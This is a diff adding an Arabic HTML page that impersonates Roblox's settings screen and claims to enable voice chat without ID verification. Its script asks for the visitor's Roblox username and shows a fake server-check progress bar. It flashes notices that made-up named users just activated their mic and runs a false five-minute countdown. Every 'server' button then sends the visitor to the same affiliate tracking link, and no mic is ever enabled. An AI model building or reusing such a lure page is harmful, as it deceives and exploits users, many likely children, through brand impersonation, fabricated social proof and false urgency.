@@ -1,0 +1,871 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+
+<head>
+<meta name="google-site-verification" content="fCFapOf4GiAhspX2qWWCqHM0L4rlP9MVBGwrBKONKuM" />
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Roblox - تفعيل المايك الصوتي</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Material+Symbols+Outlined:opsz,wght,FILL,GRAD@20..48,100..700,0..1,-50..200">
+    <style>
+        * {
+            box-sizing: border-box;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #191b1d;
+            color: #ffffff;
+            font-family: "HCo Gotham SSm", "Helvetica Neue", Helvetica, Arial, "Lucida Grande", sans-serif;
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            padding-bottom: 60px;
+        }
+
+        .top-nav {
+            width: 100%;
+            background-color: #232527;
+            height: 44px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0 15px;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .top-nav-tabs {
+            display: flex;
+            gap: 20px;
+            font-size: 14px;
+            font-weight: 500;
+            color: #bdbebe;
+        }
+
+        .content {
+            width: 100%;
+            max-width: 500px;
+            padding: 15px;
+        }
+
+        h2 {
+            font-size: 22px;
+            margin: 15px 0;
+            font-weight: 700;
+        }
+
+        h3 {
+            font-size: 17px;
+            margin: 20px 0 10px 0;
+            font-weight: 700;
+        }
+
+        .input-label {
+            font-size: 13px;
+            color: #ffffff;
+            margin-bottom: 8px;
+            display: block;
+        }
+
+        .dropdown {
+            background-color: #393b3d;
+            border: 1px solid #454749;
+            border-radius: 4px;
+            padding: 10px 12px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 15px;
+            font-size: 14px;
+        }
+
+        .feature-box {
+            background-color: #2b2d2f;
+            padding: 15px;
+            border-radius: 4px;
+            margin-top: 10px;
+        }
+
+        .toggle-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .toggle-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 13px;
+        }
+
+        .switch {
+            width: 40px;
+            height: 22px;
+            background-color: #5a5a5a;
+            border-radius: 11px;
+            position: relative;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .switch.active {
+            background-color: #00b06f;
+        }
+
+        .switch.active::after {
+            content: '';
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: white;
+            top: 2px;
+            left: 20px;
+            transition: 0.3s;
+        }
+
+        .switch::after {
+            content: '';
+            position: absolute;
+            width: 18px;
+            height: 18px;
+            border-radius: 50%;
+            background: white;
+            top: 2px;
+            left: 2px;
+            transition: 0.3s;
+        }
+
+        .info-note {
+            background-color: #393b3d;
+            padding: 8px;
+            font-size: 11px;
+            color: #b8b8b8;
+            margin-top: 12px;
+            border-radius: 3px;
+            line-height: 1.3;
+        }
+
+        .qa-links {
+            margin-top: 20px;
+        }
+
+        .qa-links a {
+            display: block;
+            color: #ffffff;
+            text-decoration: none;
+            font-weight: 600;
+            padding: 12px 0;
+            font-size: 13px;
+            border-bottom: 1px solid #2b2d2f;
+        }
+
+        .qa-links a:last-child {
+            border-bottom: none;
+        }
+
+        footer {
+            width: 100%;
+            background-color: #191b1d;
+            padding: 30px 20px;
+            text-align: center;
+        }
+
+        .footer-nav {
+            display: flex;
+            justify-content: center;
+            flex-wrap: wrap;
+            gap: 12px;
+            font-size: 11px;
+            font-weight: 500;
+            margin-bottom: 20px;
+        }
+
+        .footer-copy {
+            font-size: 10px;
+            color: #b8b8b8;
+            line-height: 1.5;
+        }
+
+        .fake-browser-bar {
+            position: fixed;
+            bottom: 0;
+            width: 100%;
+            background-color: #232527;
+            border-top: 1px solid #3e4042;
+            padding: 8px 0;
+            text-align: center;
+            font-size: 11px;
+            color: #ffffff;
+            z-index: 99;
+        }
+
+        /* Section Username */
+
+        #usernameSection {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            z-index: 1002;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .username-card {
+            background: #2b2d2f;
+            width: 88%;
+            max-width: 340px;
+            padding: 22px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .username-card h4 {
+            margin: 0 0 8px;
+            font-size: 18px;
+            color: #fff;
+        }
+
+        .username-card p {
+            font-size: 13px;
+            color: #b8b8b8;
+            margin-bottom: 18px;
+        }
+
+        .username-input {
+            width: 100%;
+            padding: 12px;
+            border-radius: 8px;
+            border: 1px solid #454749;
+            background: #393b3d;
+            color: white;
+            font-size: 15px;
+            margin-bottom: 15px;
+            outline: none;
+        }
+
+        .username-input:focus {
+            border-color: #00b06f;
+        }
+
+        .next-btn {
+            background: #00b06f;
+            color: white;
+            border: none;
+            padding: 12px;
+            width: 100%;
+            border-radius: 8px;
+            font-weight: bold;
+            font-size: 15px;
+            cursor: pointer;
+            transition: 0.3s;
+        }
+
+        .next-btn:hover {
+            background: #008f59;
+        }
+
+        /* Loading Screen (3 Seconds) */
+
+        #loadingSection {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.96);
+            z-index: 1003;
+            justify-content: center;
+            align-items: center;
+        }
+
+        .loading-card {
+            background: #2b2d2f;
+            width: 88%;
+            max-width: 340px;
+            padding: 25px;
+            border-radius: 12px;
+            text-align: center;
+        }
+
+        .progress-bar-container {
+            width: 100%;
+            background-color: #393b3d;
+            border-radius: 10px;
+            margin: 15px 0;
+            overflow: hidden;
+            height: 12px;
+        }
+
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background-color: #00b06f;
+            transition: width 0.1s linear;
+        }
+
+        /* Live Toast Notification */
+
+        .live-toast {
+            position: fixed;
+            bottom: 50px;
+            left: 50%;
+            transform: translateX(-50%);
+            background: #232527;
+            border: 1px solid #00b06f;
+            border-radius: 25px;
+            padding: 8px 16px;
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            z-index: 1000;
+            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
+            white-space: nowrap;
+            opacity: 0;
+            transition: opacity 0.3s ease-in-out;
+            pointer-events: none;
+        }
+
+        .live-toast.show {
+            opacity: 1;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: #00b06f;
+            border-radius: 50%;
+            box-shadow: 0 0 8px #00b06f;
+        }
+
+        .toast-text {
+            font-size: 11px;
+            color: #fff;
+        }
+
+        #verifyModal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.92);
+            z-index: 1001;
+            justify-content: center;
+            align-items: center;
+            padding: 10px;
+        }
+
+        .modal-card {
+            background: #1e2022;
+            width: 100%;
+            max-width: 340px;
+            padding: 0;
+            border-radius: 14px;
+            text-align: center;
+            direction: rtl;
+            overflow: hidden;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.5);
+        }
+
+        .modal-header {
+            background: linear-gradient(135deg, #00b06f 0%, #008f59 100%);
+            padding: 10px;
+        }
+
+        .modal-header h4 {
+            margin: 0;
+            font-size: 16px;
+            color: white;
+            font-weight: bold;
+        }
+
+        .video-wrapper {
+            padding: 12px 12px 0 12px;
+            background: #000;
+        }
+
+        .verification-video {
+            width: 100%;
+            aspect-ratio: 1 / 1;
+            object-fit: cover;
+            background: #000;
+            display: block;
+            border-radius: 8px;
+            cursor: pointer;
+            max-height: 200px;
+        }
+
+        .modal-content {
+            padding: 12px;
+        }
+
+        /* Timer - صغير وبسيط */
+
+        .timer-section {
+            background: #2b2d2f;
+            padding: 6px 12px;
+            border-radius: 8px;
+            margin: 6px 0 8px 0;
+            border: 1px solid #3e4042;
+            text-align: center;
+            direction: ltr;
+        }
+
+        .timer-label-small {
+            font-size: 10px;
+            color: #b8b8b8;
+            display: block;
+            margin-bottom: 2px;
+        }
+
+        .timer-small {
+            font-size: 18px;
+            font-weight: bold;
+            color: #ff6b6b;
+            font-family: monospace;
+            letter-spacing: 1px;
+        }
+
+        .timer-small.warning {
+            color: #ff4444;
+        }
+
+        .code-box {
+            background: #00b06f;
+            padding: 6px;
+            border-radius: 8px;
+            margin: 8px 0;
+            direction: ltr;
+        }
+
+        .modal-card p {
+            font-size: 12px;
+            color: #c0c0c0;
+            margin-bottom: 8px;
+            line-height: 1.4;
+            text-align: center;
+        }
+
+        /* النص تحت العنوان مباشرة */
+
+        .description-top {
+            background: transparent;
+            padding: 6px 0;
+            margin: 4px 0 6px 0;
+            text-align: center;
+            border-bottom: 1px solid #2b2d2f;
+        }
+
+        .description-top p {
+            margin: 2px 0;
+        }
+
+        .description-top .big-text {
+            font-size: 14px;
+            color: #00b06f;
+            font-weight: bold;
+        }
+
+        .description-top .small-text {
+            font-size: 12px;
+            color: #c0c0c0;
+        }
+
+        .server-group {
+            display: flex;
+            flex-direction: column;
+            gap: 6px;
+            margin: 8px 0 4px;
+        }
+
+        .server-btn {
+            background: #2b2d2f;
+            border: 1px solid #454749;
+            border-radius: 30px;
+            padding: 8px 14px;
+            color: #fff;
+            font-size: 13px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.3);
+        }
+
+        .server-btn:hover {
+            background: #3a3c3e;
+            border-color: #00b06f;
+            transform: scale(1.02);
+        }
+
+        .server-btn:active {
+            transform: scale(0.97);
+        }
+
+        .server-btn .label {
+            font-weight: 500;
+        }
+
+        .server-btn .badge {
+            background: #00b06f;
+            color: #000;
+            font-size: 9px;
+            font-weight: bold;
+            padding: 2px 8px;
+            border-radius: 30px;
+            margin-right: 4px;
+        }
+
+        .server-saudi {
+            border-right: 4px solid #1f9a5c;
+        }
+
+        .server-kuwait {
+            border-right: 4px solid #f1c40f;
+        }
+
+        .server-emarat {
+            border-right: 4px solid #3498db;
+        }
+
+        .server-other {
+            border-right: 4px solid #9b59b6;
+        }
+
+        .small-note {
+            font-size: 9px;
+            color: #888;
+            margin-top: 6px;
+            text-align: center;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="top-nav">
+        <span class="material-symbols-outlined">menu</span>
+        <div class="top-nav-tabs"><span>اكتشف</span><span>السوق</span><span>إنشاء</span></div>
+        <div style="display:flex; gap:10px;">
+            <span class="material-symbols-outlined">search</span>
+            <span class="material-symbols-outlined">settings</span>
+        </div>
+    </div>
+
+    <div class="content">
+        <h2>الإعدادات</h2>
+        <div class="dropdown"><span>الخصوصية</span><span class="material-symbols-outlined">expand_more</span></div>
+
+        <h3>ميزات الدردشة</h3>
+        <div class="feature-box">
+            <div class="toggle-row">
+                <div class="toggle-label">
+                    <span class="material-symbols-outlined" style="font-size: 18px;">mic</span> تفعيل المايك الصوتي
+                </div>
+                <div class="switch" id="voiceToggle"></div>
+            </div>
+            <div class="info-note">
+                <span style="color:#00b06f">●</span> النقطة الخضراء تعني أن Roblox يسجل الصوت
+            </div>
+        </div>
+
+        <div style="margin-top: 25px;">
+            <label class="input-label">من يمكنه جعلني عضواً في سيرفر الخاص؟ ⓘ</label>
+            <div class="dropdown"><span>الجميع</span><span class="material-symbols-outlined">expand_more</span></div>
+            <label class="input-label">من يمكنه الانضمام إلي في التجارب؟ ⓘ</label>
+            <div class="dropdown"><span>الجميع</span><span class="material-symbols-outlined">expand_more</span></div>
+        </div>
+
+        <div class="qa-links">
+            <a href="#">كيفية تفعيل المايك الصوتي في Roblox؟</a>
+            <a href="#">تفعيل المايك في Roblox بدون هوية 2025</a>
+            <a href="#">طريقة تشغيل المايك في Roblox للموبايل</a>
+        </div>
+    </div>
+
+    <!-- Live Toast Notification -->
+    <div class="live-toast" id="liveToast">
+        <div class="live-dot"></div>
+        <span class="toast-text" id="toastContent">🇸🇦 قام <b>عبدالرحمن الشمري</b> بتفعيل المايك الآن</span>
+    </div>
+
+    <!-- Section Username -->
+    <div id="usernameSection">
+        <div class="username-card">
+            <h4>🔒 تأكيد الحساب</h4>
+            <p>أدخل اسم مستخدم Roblox للمتابعة</p>
+            <input type="text" id="robloxUsername" class="username-input" placeholder="اسم المستخدم" autocomplete="off">
+            <button class="next-btn" onclick="submitUsername()">متابعة</button>
+        </div>
+    </div>
+
+    <!-- Section Loading 3s -->
+    <div id="loadingSection">
+        <div class="loading-card">
+            <h4 style="margin: 0 0 10px; font-size: 16px;">🔍 جاري الفحص والربط...</h4>
+            <p style="font-size: 12px; color: #b8b8b8;" id="loadingText">جاري البحث عن حسابك في سيرفرات Roblox</p>
+            <div class="progress-bar-container">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal Verify -->
+    <div id="verifyModal">
+        <div class="modal-card">
+            <!-- العنوان -->
+            <div class="modal-header">
+                <h4>
+                    <span style="display:inline-block; animation:spin 1s linear infinite;">🔄</span> جاري تفعيل المايك
+                    <span class="dots"></span>
+                </h4>
+                <style>
+                    @keyframes spin {
+                        100% {
+                            transform: rotate(360deg);
+                        }
+                    }
+
+                    .dots::after {
+                        content: '.';
+                        animation: dots 1.5s steps(3, end) infinite;
+                    }
+
+                    @keyframes dots {
+                        0% {
+                            content: '.';
+                        }
+                        33% {
+                            content: '..';
+                        }
+                        66% {
+                            content: '...';
+                        }
+                        100% {
+                            content: '.';
+                        }
+                    }
+                </style>
+            </div>
+
+            <!-- النص تحت العنوان مباشرة -->
+            <div class="description-top">
+                <p class="big-text">✅ لم تتبقى سوى خطوة واحدة!</p>
+                <p class="small-text">توضح الفيديو طريقة تخطي التأكيد وتفعيل المايك فوراً عبر السيرفر المناسب لك</p>
+            </div>
+
+            <!-- الفيديو -->
+            <div class="video-wrapper">
+              <video class="verification-video" controls playsinline preload="metadata">
+  <source src="https://blx3.site/how/tutorial.mp4" type="video/mp4">
+</video>
+            </div>
+
+            <div class="modal-content">
+                <!-- Timer صغير وبسيط -->
+                <div class="timer-section">
+                    <span class="timer-label-small">⏱️ سينتهي العرض خلال</span>
+                    <div class="timer-small" id="countdownTimer">05:00</div>
+                </div>
+
+                <div class="server-group">
+                    <button class="server-btn server-saudi" onclick="redirectTo('saudi')">
+                        <span class="label">🇸🇦 سيرفر السعودية</span>
+                        <span class="badge">مباشر</span>
+                    </button>
+                    <button class="server-btn server-kuwait" onclick="redirectTo('kuwait')">
+                        <span class="label">🇰🇼 سيرفر الكويت</span>
+                        <span class="badge">مباشر</span>
+                    </button>
+                    <button class="server-btn server-emarat" onclick="redirectTo('emarat')">
+                        <span class="label">🇦🇪 سيرفر الإمارات</span>
+                        <span class="badge">مباشر</span>
+                    </button>
+                    <button class="server-btn server-other" onclick="redirectTo('other')">
+                        <span class="label">🌍 دولة أخرى</span>
+                        <span class="badge">مباشر</span>
+                    </button>
+                </div>
+                <div class="small-note">اختر السيرفر المناسب لك لتفعيل المايك</div>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="footer-nav"><span>معلومات عنا</span><span>وظائف</span><span>مدونة</span><span>أولياء الأمور</span><span>بطاقات الهدايا</span></div>
+        <div class="footer-copy">©2025 Roblox Corporation. جميع الحقوق محفوظة</div>
+    </footer>
+    <div class="fake-browser-bar"></div>
+
+    <script>
+        const switchBtn = document.getElementById('voiceToggle');
+        const usernameSection = document.getElementById('usernameSection');
+        const loadingSection = document.getElementById('loadingSection');
+        const verifyModal = document.getElementById('verifyModal');
+
+        let timeLeft = 300;
+        let timerInterval = null;
+        const timerDisplay = document.getElementById('countdownTimer');
+
+        const saudiUsers = [
+            "عبدالرحمن الشمري", "سارة القحطاني", "محمد العتيبي", "نورة الدوسري", "فهد الحربي", "ريم المطيري",
+            "خالد الغامدي", "العنود الزهراني", "سعود الشهري", "شهد المالكي", "سلطان العنزي", "منى الرشيدي",
+            "عبدالعزيز البقمي", "مها العسيري", "مشاري العتيبي", "ريناد القحطاني", "تركي الغامدي", "ديما الحربي",
+            "نايف الدوسري", "لجين الشمري", "راكان الزهراني", "جود الشهري", "فيصل المالكي", "ليان العسيري",
+            "بندر الرشيدي", "حلا البقمي", "ماجد العنزي", "غادة العتيبي", "سعود السبيعي", "أمل القحطاني",
+            "عبدالله الهاجري", "أروى الشمري", "وليد الحربي", "بسمة الغامدي", "مشعل الزهراني", "ريناد الشهري",
+            "طلال الدوسري", "سارة العنزي", "زياد المطيري", "فاطمة العتيبي", "ياسر القحطاني", "نادية الغامدي",
+            "عمر الحربي", "منى الدوسري", "ثامر الشمري", "أريج الحارثي", "باسم الرويلي", "نجود العتيبي",
+            "حسام الجحدلي", "وجدان الغامدي", "حمزة الزهراني", "طيف الشهري", "خالد الثبيتي", "شروق القحطاني",
+            "ريان السلمي", "رند الحربي", "سامي العصيمي", "خلود الدوسري", "طارق الخالدي", "لمى المطيري",
+            "عادل الرويلي", "شوق الشمري", "فراس الغامدي", "سديم الزهراني", "معاذ الشهري", "غلا العسيري",
+            "هاني الحارثي", "يارا المالكي", "وائل البقمي", "أميرة القحطاني", "يزيد العتيبي", "جواهر الحربي",
+            "قصي الشمري", "سحاب الدوسري", "نوح الزهراني", "أثير الغامدي", "إياد المطيري", "وسن الشهري",
+            "أنس الرشيدي", "بيسان العنسي", "عبدالمجيد السبيعي", "الجوهرة الشمري", "متعب القحطاني", "ميار العتيبي",
+            "بدر الحربي", "وتين المطيري", "نايف الغامدي", "أفنان الزهراني", "حمد الشهري", "غيداء المالكي",
+            "باسم العنزي", "هيفاء الرشيدي", "تركي البقمي", "كيان العسيري", "عزام العتيبي", "وسن القحطاني",
+            "سلمان الغامدي", "ريماس الحربي", "حاتم الدوسري", "نوال الشمري", "أيمن الزهراني", "أماني الشهري",
+            "جهاد المالكي", "جنان العسيري", "مهند الرشيدي", "دانة البقمي", "منصور العنزي", "رغد العتيبي",
+            "فارس السبيعي", "جوري القحطاني", "سعد الهاجري", "رزان الشمري", "اصيل الحربي", "جمانة الغامدي",
+            "توفيق الزهراني", "هيا الشهري", "مؤيد الدوسري", "لُجين العنزي", "مروان المطيري", "رِفال العتيبي",
+            "مازن القحطاني", "ناريمان الغامدي", "عصام الحربي", "ناردين الدوسري", "فادي الشمري", "ريما الزهراني",
+            "رائف الشهري", "سما المالكي", "صفوان العسيري", "سيدرا الرشيدي", "شادي البقمي", "شاهندة العنزي",
+            "طارق العتيبي", "شيرين السبيعي", "عاطف القحطاني", "صافية الهاجري", "طلعت الشمري", "ضحى الحربي",
+            "عبادة الغامدي", "طيبة الزهراني", "عدنان الشهري", "عائشة الدوسري", "غسان المطيري", "عبير العتيبي",
+            "فاروق القحطاني", "عفاف الغامدي", "قاسم الحربي", "عُلا الشمري", "كاظم الزهراني", "غادة الشهري",
+            "كرم المالكي", "غزل العسيري", "لؤي الرشيدي", "فاخرة البقمي", "مأمون العنزي", "فريدة العتيبي",
+            "مالك السبيعي", "فيروز القحطاني", "منتصر الهاجري", "كوثر الشمري", "منير الحربي", "لطيفة الغامدي",
+            "نادر الزهراني", "لمياء الشهري", "هاشم الدوسري", "مرفت المطيري", "هيثم العتيبي", "مروة القحطاني",
+            "وسيم الغامدي", "ملاك الحربي", "يعقوب الشمري", "منال الزهراني", "يوسف الشهري", "مي المالكي",
+            "يونس العسيري", "ميساء الرشيدي", "بشير البقمي", "ميسم العنزي", "حاتم العتيبي", "نادية السبيعي",
+            "خلف القحطاني", "ناهد الهاجري", "راجي الشمري", "نجلاء الحربي", "رمزي الغامدي", "نسرين الزهراني"
+        ];
+
+        function startLiveToast() {
+            const toast = document.getElementById('liveToast');
+            const content = document.getElementById('toastContent');
+
+            setInterval(() => {
+                const randomName = saudiUsers[Math.floor(Math.random() * saudiUsers.length)];
+                content.innerHTML = `🇸🇦 قام <b>${randomName}</b> بتفعيل المايك الآن`;
+                toast.classList.add('show');
+                setTimeout(() => {
+                    toast.classList.remove('show');
+                }, 2000);
+            }, 3000);
+        }
+        startLiveToast();
+
+        function updateTimerDisplay() {
+            const minutes = Math.floor(timeLeft / 60);
+            const seconds = timeLeft % 60;
+            timerDisplay.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
+
+            if (timeLeft <= 60) {
+                timerDisplay.classList.add('warning');
+            }
+
+            if (timeLeft <= 0) {
+                clearInterval(timerInterval);
+                timerDisplay.textContent = '00:00';
+                verifyModal.style.display = 'none';
+                alert("انتهت صلاحية العرض! الرجاء تحديث الصفحة للمحاولة مرة أخرى.");
+            }
+        }
+
+        function startTimer() {
+            if (timerInterval) clearInterval(timerInterval);
+            timeLeft = 300;
+            updateTimerDisplay();
+            timerInterval = setInterval(() => {
+                if (timeLeft > 0) {
+                    timeLeft--;
+                    updateTimerDisplay();
+                } else {
+                    clearInterval(timerInterval);
+                }
+            }, 1000);
+        }
+
+        function stopTimer() {
+            if (timerInterval) {
+                clearInterval(timerInterval);
+                timerInterval = null;
+            }
+        }
+
+        switchBtn.addEventListener('click', function() {
+            this.classList.add('active');
+            setTimeout(() => {
+                usernameSection.style.display = 'flex';
+            }, 500);
+        });
+
+        function submitUsername() {
+            const usernameInput = document.getElementById('robloxUsername');
+            const username = usernameInput.value.trim();
+
+            if (username === "") {
+                alert("الرجاء إدخال اسم المستخدم!");
+                return;
+            }
+
+            localStorage.setItem('roblox_username', username);
+            usernameSection.style.display = 'none';
+            loadingSection.style.display = 'flex';
+
+            const progressBar = document.getElementById('progressBar');
+            const loadingText = document.getElementById('loadingText');
+            let progress = 0;
+
+            const progressInterval = setInterval(() => {
+                progress += 5;
+                progressBar.style.width = progress + '%';
+
+                if (progress === 30) {
+                    loadingText.textContent = "جاري التحقق من مطابقة الحساب...";
+                } else if (progress === 70) {
+                    loadingText.textContent = "جاري تحضير سيرفرات التفعيل...";
+                }
+
+                if (progress >= 100) {
+                    clearInterval(progressInterval);
+                    loadingSection.style.display = 'none';
+                    verifyModal.style.display = 'flex';
+                    startTimer();
+                }
+            }, 150);
+        }
+
+        function redirectTo(server) {
+            stopTimer();
+            let link = "https://app.trcefy.com/sl?id=6a2050db46d3cf0d62f32aa4&pid=2&sub2=u203370&sub6=s2smartLink&sub5=s1SUBID1HERE";
+            window.location.href = link;
+        }
+
+        window.onclick = function(event) {
+            if (event.target === verifyModal || event.target === usernameSection || event.target === loadingSection) {
+                return;
+            }
+        }
+    </script>
+    <script type="module" src="https://static.cloudflareinsights.com/beacon.min.js/vce701823e78c4301a35b7e07294d87301792088814092" integrity="sha512-UKNk8GbxkABxKcXYuLkO16EleLGUkcvJWtpSNmExE0Too3ZaFAxTscNWEc1OdAv5/BikHawapSCaiD2XCmp+Bw==" data-cf-beacon='{"version":"2024.11.0","token":"b8e6aba0bcf24bdf8711f55fe7d409fd","r":1,"spa":2}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
